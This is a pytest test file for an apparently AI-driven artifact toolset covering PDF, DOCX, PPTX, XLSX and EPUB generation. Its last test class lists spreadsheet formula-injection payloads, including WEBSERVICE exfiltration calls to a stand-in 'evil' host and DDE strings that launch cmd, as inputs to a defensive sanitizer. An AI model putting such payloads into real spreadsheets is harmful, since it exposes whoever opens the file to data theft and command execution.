"""Tests for artifact tools (document, presentation, spreadsheet) and routes."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

from augmentum.tools.base import ToolCategory, ToolResult, format_output_with_warnings

# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def mock_artifact_store():
    """Create a mock ArtifactStore that returns predictable data."""
    store = AsyncMock()
    store.save = AsyncMock(return_value={
        "id": "abc123",
        "filename": "Test_Doc.pdf",
        "display_name": "Test Doc.pdf",
        "format": "pdf",
        "size_bytes": 1234,
        "path": "standalone/Test_Doc.pdf",
        "download_url": "/api/artifacts/abc123/download",
    })
    store.get = AsyncMock(return_value={
        "id": "abc123",
        "filename": "Test_Doc.pdf",
        "display_name": "Test Doc.pdf",
        "format": "pdf",
        "size_bytes": 1234,
        "path": "standalone/Test_Doc.pdf",
        "download_url": "/api/artifacts/abc123/download",
    })
    store.list_for_session = AsyncMock(return_value=[])
    store.list_for_task = AsyncMock(return_value=[])
    store.delete = AsyncMock(return_value=True)
    store.get_file_path = MagicMock(return_value=Path("/tmp/fake.pdf"))
    return store


# ---------------------------------------------------------------------------
# Document format intent classifier
# ---------------------------------------------------------------------------

class TestInferDocumentFormat:
    """The DocumentTool defaults to PDF. ``infer_document_format`` lets
    callers pick a smarter default by reading the user's original ask —
    addresses the audit finding that a user requesting a "Word document"
    was silently getting a PDF.
    """

    @pytest.mark.parametrize("text", [
        "make me a Word document about quarterly sales",
        "please create a word doc for this",
        "export as docx",
        "save as .docx please",
        "I need an editable document I can modify in MS Word",
        "send me the editable version",
        "I want track changes on this",
        "can you give me a Microsoft Word file",
    ])
    def test_docx_signals(self, text):
        from augmentum.tools.artifact_document import infer_document_format
        assert infer_document_format(text) == "docx", text

    @pytest.mark.parametrize("text", [
        "make a PDF report on the product launch",
        "give me a pdf",
        "export to .pdf",
        "produce a print-ready version",
        "I need a printable document",
        "create the final document for sign-off",
        "final report please",
    ])
    def test_pdf_signals(self, text):
        from augmentum.tools.artifact_document import infer_document_format
        assert infer_document_format(text) == "pdf", text

    @pytest.mark.parametrize("text", [
        "create a document about climate change",
        "write a report on the meeting",
        "",
        "something",
    ])
    def test_no_signal_returns_none(self, text):
        from augmentum.tools.artifact_document import infer_document_format
        assert infer_document_format(text) is None

    def test_both_signals_prefers_later_mention(self):
        """Users often walk back: 'a PDF, actually make it a Word doc'.
        Whichever word comes last in the sentence wins."""
        from augmentum.tools.artifact_document import infer_document_format
        assert infer_document_format(
            "send me a PDF — actually, make it a Word document"
        ) == "docx"
        assert infer_document_format(
            "I want a Word doc. No wait, PDF please"
        ) == "pdf"


# ---------------------------------------------------------------------------
# PDF Unicode fallback sanitization
# ---------------------------------------------------------------------------

class TestPdfSanitizeForFallback:
    """Cover the _sanitize_for_pdf helper that was previously referenced
    but undefined (pre-existing NameError on the Helvetica fallback path
    — see audit finding on PDF font fallback).
    """

    def test_ascii_unchanged(self):
        from augmentum.tools.artifact_document import _sanitize_for_pdf
        assert _sanitize_for_pdf("Hello, world!") == "Hello, world!"

    def test_latin1_unchanged(self):
        from augmentum.tools.artifact_document import _sanitize_for_pdf
        # é, ñ, ü are all valid Latin-1
        assert _sanitize_for_pdf("café naïve über") == "café naïve über"

    def test_smart_quotes_downgraded_to_ascii(self):
        from augmentum.tools.artifact_document import _sanitize_for_pdf
        out = _sanitize_for_pdf("\u201chello\u201d \u2014 it\u2019s fine\u2026")
        assert out == '"hello" -- it\'s fine...'

    def test_non_latin_script_degrades_but_does_not_crash(self):
        """The previous code crashed with NameError. Now it gracefully
        produces a sanitized latin-1-safe string."""
        from augmentum.tools.artifact_document import _sanitize_for_pdf
        out = _sanitize_for_pdf("Hello 日本語 world")
        assert isinstance(out, str)
        # Japanese chars decompose or get replaced — the point is no crash
        out.encode("latin-1")  # must not raise

    def test_emoji_degrades_safely(self):
        from augmentum.tools.artifact_document import _sanitize_for_pdf
        out = _sanitize_for_pdf("Success \U0001F389")
        out.encode("latin-1")

    def test_empty_string_passthrough(self):
        from augmentum.tools.artifact_document import _sanitize_for_pdf
        assert _sanitize_for_pdf("") == ""


class TestPdfWillDowngradeUnicode:
    """The pre-flight check used in execute() to decide whether to warn."""

    def test_false_when_fonts_available(self, monkeypatch):
        from augmentum.tools import artifact_document
        monkeypatch.setattr(artifact_document, "_unicode_fonts_available", lambda: True)
        assert artifact_document.pdf_render_will_downgrade_unicode(
            [{"heading": "h", "body": "日本語"}]
        ) is False

    def test_false_when_content_is_ascii(self, monkeypatch):
        from augmentum.tools import artifact_document
        monkeypatch.setattr(artifact_document, "_unicode_fonts_available", lambda: False)
        assert artifact_document.pdf_render_will_downgrade_unicode(
            [{"heading": "Plain", "body": "ASCII only"}]
        ) is False

    def test_true_when_no_fonts_and_unicode_content(self, monkeypatch):
        from augmentum.tools import artifact_document
        monkeypatch.setattr(artifact_document, "_unicode_fonts_available", lambda: False)
        assert artifact_document.pdf_render_will_downgrade_unicode(
            [{"heading": "Hello", "body": "日本語"}]
        ) is True

    def test_handles_empty_and_missing_fields(self, monkeypatch):
        from augmentum.tools import artifact_document
        monkeypatch.setattr(artifact_document, "_unicode_fonts_available", lambda: False)
        assert artifact_document.pdf_render_will_downgrade_unicode([]) is False
        assert artifact_document.pdf_render_will_downgrade_unicode(
            [{"heading": "h"}]
        ) is False


# ---------------------------------------------------------------------------
# PPTX preview — speaker notes surfacing
# ---------------------------------------------------------------------------

class TestPptxPreviewSpeakerNotes:
    """The preview HTML must now show speaker notes under each slide —
    previously the notes were persisted into the PPTX but invisible in
    the web preview (HIGH-severity finding in the audit)."""

    def test_preview_includes_speaker_notes(self, tmp_path):
        from augmentum.proxy.artifact_routes import _pptx_to_html
        from augmentum.tools.artifact_presentation import _render_pptx

        data = _render_pptx(
            "Quarterly", "", "",
            [
                {
                    "layout": "content",
                    "title": "Quarterly Revenue",
                    "body": "- $4.2M up 12% YoY\n- Driven by enterprise",
                    "notes": "Emphasize the enterprise pipeline. Mention retention 94%.",
                },
            ],
        )
        pptx_path = tmp_path / "deck.pptx"
        pptx_path.write_bytes(data)
        html = _pptx_to_html(pptx_path, "Quarterly", "/api/artifacts/x/download")
        assert html is not None
        assert "Speaker notes" in html
        assert "enterprise pipeline" in html
        assert "94%" in html

    def test_preview_notes_block_omitted_when_absent(self, tmp_path):
        from augmentum.proxy.artifact_routes import _pptx_to_html
        from augmentum.tools.artifact_presentation import _render_pptx

        data = _render_pptx(
            "Deck", "", "",
            [{"layout": "content", "title": "No notes here", "body": "Just body"}],
        )
        pptx_path = tmp_path / "deck2.pptx"
        pptx_path.write_bytes(data)
        html = _pptx_to_html(pptx_path, "Deck", "/api/artifacts/x/download")
        assert html is not None
        assert "Speaker notes" not in html


# ---------------------------------------------------------------------------
# DOCX markdown parity
# ---------------------------------------------------------------------------

class TestDocxMarkdownParity:
    """Cover the expanded _render_docx_body: inline code, code blocks,
    nested lists, inline headings — the parity gap with PDF that the
    audit flagged as CRITICAL (same body content produced wildly
    different output across formats)."""

    def _render_and_parse(self, body: str):
        from io import BytesIO

        from docx import Document  # type: ignore[import-untyped]

        from augmentum.tools.artifact_document import _render_docx
        data = _render_docx("T", "A", [{"heading": "S", "body": body}])
        return Document(BytesIO(data))

    def test_inline_code_uses_monospace(self):
        doc = self._render_and_parse("Use the `foo()` helper here.")
        # Find the paragraph body and locate the monospace run
        para = [p for p in doc.paragraphs if "helper" in p.text][0]
        mono_runs = [r for r in para.runs if r.font.name == "Consolas"]
        assert mono_runs, "inline `code` must produce a monospace run"
        assert any(r.text == "foo()" for r in mono_runs)

    def test_code_block_preserved_as_monospace(self):
        body = "Some intro.\n\n```python\ndef hello():\n    return 42\n```\n\nAfter."
        doc = self._render_and_parse(body)
        # Find paragraph containing the code
        code_para = [p for p in doc.paragraphs if "def hello" in p.text]
        assert code_para, "fenced code block must land in its own paragraph"
        assert any(r.font.name == "Consolas" for r in code_para[0].runs)
        assert "return 42" in code_para[0].text

    def test_nested_bullets_get_list_bullet_styles(self):
        body = (
            "- Top one\n"
            "  - Nested A\n"
            "  - Nested B\n"
            "- Top two\n"
        )
        doc = self._render_and_parse(body)
        styles = [p.style.name for p in doc.paragraphs if p.text.strip()
                  and p.style.name.startswith("List Bullet")]
        # Two top-level, two nested
        assert styles.count("List Bullet") == 2
        assert styles.count("List Bullet 2") == 2

    def test_numbered_list_handled(self):
        body = "1. First\n2. Second\n3. Third\n"
        doc = self._render_and_parse(body)
        num_paras = [p for p in doc.paragraphs if p.style.name.startswith("List Number")]
        assert len(num_paras) == 3
        assert [p.text for p in num_paras] == ["First", "Second", "Third"]

    def test_inline_heading_inside_body_promotes_to_heading(self):
        body = "Intro paragraph.\n\n## Subsection\n\nMore text."
        doc = self._render_and_parse(body)
        headings = [p for p in doc.paragraphs if p.style.name.startswith("Heading")]
        # Section heading "S" + the inline ## Subsection
        assert any("Subsection" in p.text for p in headings)

    def test_bold_italic_still_work(self):
        doc = self._render_and_parse("This is **bold** and this is *italic*.")
        runs = doc.paragraphs[-1].runs  # last para is body
        # Find the bold/italic runs
        assert any(r.bold and r.text == "bold" for r in runs)
        assert any(r.italic and r.text == "italic" for r in runs)


# ---------------------------------------------------------------------------
# EPUB image downsampling
# ---------------------------------------------------------------------------

class TestEpubImageDownsampling:
    """_image_to_jpeg_bytes must cap very large source images so EPUBs
    don't balloon past mobile-reader limits (HIGH audit finding)."""

    def test_small_image_is_not_upscaled(self, tmp_path):
        from io import BytesIO

        from PIL import Image as PILImage

        from augmentum.tools.artifact_ebook import _image_to_jpeg_bytes

        src = tmp_path / "tiny.png"
        PILImage.new("RGB", (400, 300), color="red").save(src)
        jpg_bytes = _image_to_jpeg_bytes(str(src))
        with PILImage.open(BytesIO(jpg_bytes)) as out:
            assert out.size == (400, 300)  # unchanged

    def test_oversized_image_is_downsampled(self, tmp_path):
        from io import BytesIO

        from PIL import Image as PILImage

        from augmentum.tools.artifact_ebook import (
            _EPUB_MAX_IMAGE_PX,
            _image_to_jpeg_bytes,
        )

        src = tmp_path / "big.png"
        # 4000×3000 source — longer side 4000 should shrink to _EPUB_MAX_IMAGE_PX.
        PILImage.new("RGB", (4000, 3000), color="blue").save(src)
        jpg_bytes = _image_to_jpeg_bytes(str(src))
        with PILImage.open(BytesIO(jpg_bytes)) as out:
            longest = max(out.size)
            assert longest == _EPUB_MAX_IMAGE_PX
            # Aspect ratio preserved (4:3)
            assert abs(out.size[0] / out.size[1] - 4 / 3) < 0.01

    def test_palette_mode_still_converts(self, tmp_path):
        from PIL import Image as PILImage

        from augmentum.tools.artifact_ebook import _image_to_jpeg_bytes

        src = tmp_path / "palette.png"
        PILImage.new("P", (200, 200), color=1).save(src)
        jpg_bytes = _image_to_jpeg_bytes(str(src))
        assert jpg_bytes.startswith(b"\xff\xd8")  # JPEG magic


# ---------------------------------------------------------------------------
# EPUB storybook CSS — dark mode + responsive breakpoint
# ---------------------------------------------------------------------------

class TestEpubStorybookCss:
    def test_dark_mode_block_present(self):
        from augmentum.tools.artifact_ebook import _STORYBOOK_CSS
        assert "prefers-color-scheme: dark" in _STORYBOOK_CSS
        # The dark block must override background so readers using dark
        # mode actually see the theme change.
        assert "background: #1a140d" in _STORYBOOK_CSS

    def test_mobile_breakpoint_present(self):
        from augmentum.tools.artifact_ebook import _STORYBOOK_CSS
        # Phones should stack illustrations rather than floating them.
        assert "max-width: 480px" in _STORYBOOK_CSS
        assert "float: none" in _STORYBOOK_CSS


# ---------------------------------------------------------------------------
# ToolResult.warnings contract
# ---------------------------------------------------------------------------

class TestToolResultWarnings:
    """The warnings field is the cross-cutting lever that replaces silent
    degradation across every artifact tool — verify the default shape and
    the format helper here, then individual tool tests cover population.
    """

    def test_default_is_empty_list(self):
        r = ToolResult(success=True)
        assert r.warnings == []

    def test_defaults_are_independent(self):
        r1 = ToolResult(success=True)
        r1.warnings.append("one")
        r2 = ToolResult(success=True)
        assert r2.warnings == [], "default_factory must yield a fresh list per instance"

    def test_format_helper_no_warnings_is_passthrough(self):
        assert format_output_with_warnings("Done.", []) == "Done."

    def test_format_helper_appends_warnings(self):
        out = format_output_with_warnings("Done.", ["A failed", "B failed"])
        assert out.startswith("Done.")
        assert "Warnings:" in out
        assert "- A failed" in out
        assert "- B failed" in out

    def test_format_helper_handles_empty_output(self):
        out = format_output_with_warnings("", ["only warning"])
        assert "Warnings:" in out
        assert "- only warning" in out


# ---------------------------------------------------------------------------
# DocumentTool
# ---------------------------------------------------------------------------

class TestDocumentTool:
    def _make_tool(self, store):
        from augmentum.tools.artifact_document import DocumentTool
        return DocumentTool(store)

    def test_name_and_category(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        assert tool.name == "create_document"
        assert tool.category == ToolCategory.ARTIFACT

    def test_description(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        assert "PDF" in tool.description or "document" in tool.description.lower()

    def test_input_schema_required(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        schema = tool.input_schema
        assert "title" in schema["required"]
        assert "sections" in schema["required"]

    @pytest.mark.asyncio
    async def test_no_sections_returns_error(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(title="Test", sections=None)
        assert not result.success
        assert "No sections" in result.error

    @pytest.mark.asyncio
    async def test_empty_sections_returns_error(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(title="Test", sections=[])
        assert not result.success

    @pytest.mark.asyncio
    async def test_unsupported_format(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Test",
            format="txt",
            sections=[{"heading": "H1", "body": "text"}],
        )
        assert not result.success
        assert "Unsupported format" in result.error

    @pytest.mark.asyncio
    async def test_pdf_generation(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Test Report",
            format="pdf",
            author="Tester",
            sections=[
                {"heading": "Introduction", "body": "Hello world"},
                {"heading": "Details", "level": 2, "body": "- item 1\n- item 2"},
            ],
        )
        assert result.success
        assert "Test Report" in result.output or "abc123" in result.output
        mock_artifact_store.save.assert_called_once()
        call_kwargs = mock_artifact_store.save.call_args
        assert call_kwargs.kwargs["fmt"] == "pdf"
        assert isinstance(call_kwargs.kwargs["data"], bytes)

    @pytest.mark.asyncio
    async def test_docx_generation(self, mock_artifact_store):
        mock_artifact_store.save.return_value["format"] = "docx"
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Test Doc",
            format="docx",
            sections=[{"heading": "Chapter 1", "body": "Some text"}],
        )
        assert result.success
        call_kwargs = mock_artifact_store.save.call_args
        assert call_kwargs.kwargs["fmt"] == "docx"

    @pytest.mark.asyncio
    async def test_pdf_with_bullet_lists(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Bullets",
            format="pdf",
            sections=[{
                "heading": "List",
                "body": "- first\n- second\n- third",
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_pdf_with_numbered_lists(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Numbers",
            format="pdf",
            sections=[{
                "heading": "Steps",
                "body": "1. Step one\n2. Step two\n3. Step three",
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_pdf_with_markdown_bold_italic(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Styled",
            format="pdf",
            sections=[{
                "heading": "Formats",
                "body": "This is **bold** and *italic* text.",
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_docx_with_formatted_text(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Formatted",
            format="docx",
            sections=[{
                "heading": "Styles",
                "body": "Text with **bold** and *italic* words.",
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_multiple_heading_levels(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Levels",
            format="pdf",
            sections=[
                {"heading": "H1", "level": 1, "body": "Level 1"},
                {"heading": "H2", "level": 2, "body": "Level 2"},
                {"heading": "H3", "level": 3, "body": "Level 3"},
                {"heading": "H4", "level": 4, "body": "Level 4"},
            ],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_metadata_in_result(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Meta",
            sections=[{"heading": "A", "body": "B"}],
        )
        assert result.metadata["id"] == "abc123"
        assert result.metadata["download_url"] == "/api/artifacts/abc123/download"


# ---------------------------------------------------------------------------
# PresentationTool
# ---------------------------------------------------------------------------

class TestPresentationTool:
    def _make_tool(self, store):
        from augmentum.tools.artifact_presentation import PresentationTool
        return PresentationTool(store)

    def test_name_and_category(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        assert tool.name == "create_presentation"
        assert tool.category == ToolCategory.ARTIFACT

    def test_input_schema(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        schema = tool.input_schema
        assert "title" in schema["required"]
        assert "slides" in schema["required"]

    @pytest.mark.asyncio
    async def test_no_slides_returns_error(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(title="Test", slides=None)
        assert not result.success
        assert "No slides" in result.error

    @pytest.mark.asyncio
    async def test_basic_presentation(self, mock_artifact_store):
        mock_artifact_store.save.return_value["format"] = "pptx"
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Test Presentation",
            subtitle="A test",
            author="Tester",
            slides=[
                {"layout": "content", "title": "Slide 1", "body": "Hello"},
                {"layout": "content", "title": "Slide 2", "body": "- Bullet 1\n- Bullet 2"},
            ],
        )
        assert result.success
        call_kwargs = mock_artifact_store.save.call_args
        assert call_kwargs.kwargs["fmt"] == "pptx"
        assert isinstance(call_kwargs.kwargs["data"], bytes)

    @pytest.mark.asyncio
    async def test_title_slide_layout(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Sections",
            slides=[
                {"layout": "title", "title": "Section 1", "body": "Introduction"},
            ],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_two_column_layout(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Comparison",
            slides=[{
                "layout": "two_column",
                "title": "Left vs Right",
                "body": "Left content|||Right content",
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_blank_layout(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Blank",
            slides=[{"layout": "blank", "title": "Custom", "body": "Free text"}],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_speaker_notes(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Notes",
            slides=[{
                "title": "With Notes",
                "body": "Content",
                "notes": "Remember to mention this",
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_slide_count_in_output(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Count",
            slides=[
                {"title": "A"},
                {"title": "B"},
                {"title": "C"},
            ],
        )
        assert result.success
        assert "3 slides" in result.output

    @pytest.mark.asyncio
    async def test_markdown_in_slides(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Styled",
            slides=[{
                "title": "Formatting",
                "body": "This is **bold** and *italic*.",
            }],
        )
        assert result.success


# ---------------------------------------------------------------------------
# SpreadsheetTool
# ---------------------------------------------------------------------------

class TestSpreadsheetTool:
    def _make_tool(self, store):
        from augmentum.tools.artifact_spreadsheet import SpreadsheetTool
        return SpreadsheetTool(store)

    def test_name_and_category(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        assert tool.name == "create_spreadsheet"
        assert tool.category == ToolCategory.ARTIFACT

    def test_input_schema(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        schema = tool.input_schema
        assert "title" in schema["required"]
        assert "sheets" in schema["required"]

    @pytest.mark.asyncio
    async def test_no_sheets_returns_error(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(title="Test", sheets=None)
        assert not result.success
        assert "No sheets" in result.error

    @pytest.mark.asyncio
    async def test_basic_spreadsheet(self, mock_artifact_store):
        mock_artifact_store.save.return_value["format"] = "xlsx"
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Sales Data",
            sheets=[{
                "name": "Q1",
                "headers": ["Month", "Revenue", "Profit"],
                "rows": [
                    ["January", 10000, 3000],
                    ["February", 12000, 4000],
                    ["March", 15000, 5500],
                ],
            }],
        )
        assert result.success
        call_kwargs = mock_artifact_store.save.call_args
        assert call_kwargs.kwargs["fmt"] == "xlsx"
        assert isinstance(call_kwargs.kwargs["data"], bytes)

    @pytest.mark.asyncio
    async def test_multiple_sheets(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Multi Sheet",
            sheets=[
                {
                    "name": "Sheet1",
                    "headers": ["A", "B"],
                    "rows": [[1, 2]],
                },
                {
                    "name": "Sheet2",
                    "headers": ["X", "Y"],
                    "rows": [[3, 4]],
                },
            ],
        )
        assert result.success
        assert "2 sheets" in result.output

    @pytest.mark.asyncio
    async def test_row_count_in_output(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Rows",
            sheets=[{
                "name": "Data",
                "headers": ["Col"],
                "rows": [["a"], ["b"], ["c"], ["d"], ["e"]],
            }],
        )
        assert result.success
        assert "5 data rows" in result.output

    @pytest.mark.asyncio
    async def test_empty_rows(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Empty",
            sheets=[{
                "name": "Empty",
                "headers": ["A", "B"],
                "rows": [],
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_freeze_header_default(self, mock_artifact_store):
        """Freeze header is enabled by default."""
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Freeze",
            sheets=[{
                "name": "Data",
                "headers": ["X"],
                "rows": [[1]],
            }],
        )
        assert result.success

    @pytest.mark.asyncio
    async def test_mixed_types_in_rows(self, mock_artifact_store):
        tool = self._make_tool(mock_artifact_store)
        result = await tool.execute(
            title="Mixed",
            sheets=[{
                "name": "Types",
                "headers": ["String", "Int", "Float", "Bool", "None"],
                "rows": [["hello", 42, 3.14, True, None]],
            }],
        )
        assert result.success


# ---------------------------------------------------------------------------
# Tool alias resolution
# ---------------------------------------------------------------------------

class TestArtifactAliases:
    def test_document_aliases(self):
        from augmentum.tools.registry import _TOOL_ALIASES
        for alias in ("document", "pdf", "docx", "create_doc", "doc", "write_document"):
            assert _TOOL_ALIASES[alias] == "create_document", f"alias '{alias}' not mapped"

    def test_presentation_aliases(self):
        from augmentum.tools.registry import _TOOL_ALIASES
        for alias in ("presentation", "pptx", "powerpoint", "slides", "create_slides"):
            assert _TOOL_ALIASES[alias] == "create_presentation", f"alias '{alias}' not mapped"

    def test_spreadsheet_aliases(self):
        from augmentum.tools.registry import _TOOL_ALIASES
        for alias in ("spreadsheet", "xlsx", "excel", "create_excel", "table"):
            assert _TOOL_ALIASES[alias] == "create_spreadsheet", f"alias '{alias}' not mapped"


# ---------------------------------------------------------------------------
# Phase category mapping
# ---------------------------------------------------------------------------

class TestArtifactPhaseMapping:
    def test_artifact_in_apply_phase(self):
        from augmentum.tools.registry import _PHASE_CATEGORIES
        assert ToolCategory.ARTIFACT in _PHASE_CATEGORIES["apply"]

    def test_artifact_in_respond_phase(self):
        from augmentum.tools.registry import _PHASE_CATEGORIES
        assert ToolCategory.ARTIFACT in _PHASE_CATEGORIES["respond"]

    def test_artifact_not_in_assess(self):
        from augmentum.tools.registry import _PHASE_CATEGORIES
        assert ToolCategory.ARTIFACT not in _PHASE_CATEGORIES.get("assess", [])


# ---------------------------------------------------------------------------
# PDF rendering internals
# ---------------------------------------------------------------------------

class TestPdfRendering:
    def test_render_pdf_returns_bytes(self):
        from augmentum.tools.artifact_document import _render_pdf
        data = _render_pdf("Title", "Author", [
            {"heading": "H1", "body": "Body text"},
        ])
        assert isinstance(data, bytes)
        assert data[:5] == b"%PDF-"

    def test_render_pdf_no_author(self):
        from augmentum.tools.artifact_document import _render_pdf
        data = _render_pdf("Title", "", [
            {"heading": "H1", "body": "Body"},
        ])
        assert isinstance(data, bytes)

    def test_render_pdf_empty_heading(self):
        from augmentum.tools.artifact_document import _render_pdf
        data = _render_pdf("Title", "", [
            {"heading": "", "body": "Just body"},
        ])
        assert isinstance(data, bytes)


# ---------------------------------------------------------------------------
# DOCX rendering internals
# ---------------------------------------------------------------------------

class TestDocxRendering:
    def test_render_docx_returns_bytes(self):
        from augmentum.tools.artifact_document import _render_docx
        data = _render_docx("Title", "Author", [
            {"heading": "H1", "body": "Body text"},
        ])
        assert isinstance(data, bytes)
        # DOCX files are ZIP archives
        assert data[:2] == b"PK"

    def test_render_docx_bullet_list(self):
        from augmentum.tools.artifact_document import _render_docx
        data = _render_docx("Title", "", [
            {"heading": "List", "body": "- a\n- b\n- c"},
        ])
        assert isinstance(data, bytes)

    def test_render_docx_numbered_list(self):
        from augmentum.tools.artifact_document import _render_docx
        data = _render_docx("Title", "", [
            {"heading": "Steps", "body": "1. first\n2. second"},
        ])
        assert isinstance(data, bytes)


# ---------------------------------------------------------------------------
# PPTX rendering internals
# ---------------------------------------------------------------------------

class TestPptxRendering:
    def test_render_pptx_returns_bytes(self):
        from augmentum.tools.artifact_presentation import _render_pptx
        data = _render_pptx("Title", "Sub", "Author", [
            {"title": "Slide 1", "body": "Hello"},
        ])
        assert isinstance(data, bytes)
        assert data[:2] == b"PK"

    def test_render_pptx_all_layouts(self):
        from augmentum.tools.artifact_presentation import _render_pptx
        data = _render_pptx("All", "", "", [
            {"layout": "title", "title": "Section"},
            {"layout": "content", "title": "Content", "body": "Text"},
            {"layout": "two_column", "title": "Compare", "body": "A|||B"},
            {"layout": "blank", "title": "Free", "body": "Custom text"},
        ])
        assert isinstance(data, bytes)


# ---------------------------------------------------------------------------
# XLSX rendering internals
# ---------------------------------------------------------------------------

class TestXlsxRendering:
    def test_render_xlsx_returns_bytes(self):
        from augmentum.tools.artifact_spreadsheet import _render_xlsx
        data = _render_xlsx([{
            "name": "Sheet1",
            "headers": ["A", "B"],
            "rows": [[1, 2], [3, 4]],
        }])
        assert isinstance(data, bytes)
        assert data[:2] == b"PK"

    def test_render_xlsx_multiple_sheets(self):
        from augmentum.tools.artifact_spreadsheet import _render_xlsx
        data = _render_xlsx([
            {"name": "S1", "headers": ["X"], "rows": [[1]]},
            {"name": "S2", "headers": ["Y"], "rows": [[2]]},
        ])
        assert isinstance(data, bytes)

    def test_render_xlsx_long_sheet_name_truncated(self):
        from augmentum.tools.artifact_spreadsheet import _render_xlsx
        data = _render_xlsx([{
            "name": "A" * 50,  # Excel limit is 31 chars
            "headers": ["Col"],
            "rows": [["val"]],
        }])
        assert isinstance(data, bytes)


# ---------------------------------------------------------------------------
# XLSX formula-injection sanitization
# ---------------------------------------------------------------------------

class TestXlsxFormulaInjection:
    """Cover the CSV/Excel-injection denylist in _neutralize_cell_value.

    The threat model: an LLM (or upstream input) emits a cell value that
    Excel will execute as a formula on open. Safe arithmetic formulas
    must still pass through unchanged.
    """

    def test_safe_arithmetic_formula_preserved(self):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        for safe in ("=SUM(A1:A10)", "=A1+B2", "=AVERAGE(B2:B5)", "=MAX(C:C)"):
            value, blocked = _neutralize_cell_value(safe)
            assert value == safe and blocked is False, safe

    def test_negative_numbers_preserved(self):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        for n in ("-42", "-3.14", "-0.001"):
            value, blocked = _neutralize_cell_value(n)
            assert value == n and blocked is False, n

    def test_plus_at_dash_text_neutralized(self):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        for payload in ("+cmd", "@SUM(1)", "-not-a-number"):
            value, _ = _neutralize_cell_value(payload)
            assert value == "'" + payload, payload

    @pytest.mark.parametrize("payload", [
        "=IMPORTXML(\"http://evil/\",\"//*\")",
        "=IMPORTHTML(\"http://evil/\",\"table\",1)",
        "=IMPORTDATA(\"http://evil/data.csv\")",
        "=WEBSERVICE(\"http://evil/exfil?d=\"&A1)",
        "=INDIRECT(\"R1C1\",FALSE)",
        "=HYPERLINK(\"javascript:alert(1)\",\"click\")",
        "=CALL(\"Shell32\",\"ShellExec\",\"...\")",
        "=DDE(\"cmd\",\"/c calc\",\"!A1\")",
        "=RTD(\"x\",\"y\",\"z\")",
        "=FILTERXML(WEBSERVICE(\"http://evil/\"),\"//*\")",
    ])
    def test_dangerous_function_blocked(self, payload):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        value, blocked = _neutralize_cell_value(payload)
        assert blocked is True, f"{payload!r} should be blocked"
        assert value.startswith("'="), f"{payload!r} not neutralized: {value!r}"

    @pytest.mark.parametrize("payload", [
        "=cmd|'/c calc'!A1",
        "=2+5+cmd|' /c calc'!A0",
        "='C:\\Windows\\System32\\cmd.exe'!A1",
    ])
    def test_dde_pipe_blocked(self, payload):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        value, blocked = _neutralize_cell_value(payload)
        assert blocked is True and value.startswith("'="), payload

    def test_case_insensitive_match(self):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        for payload in ("=importxml(\"u\",\"x\")", "=Indirect(\"A1\")", "=hyperlink(\"x\",\"y\")"):
            value, blocked = _neutralize_cell_value(payload)
            assert blocked is True, payload
            assert value.startswith("'="), payload

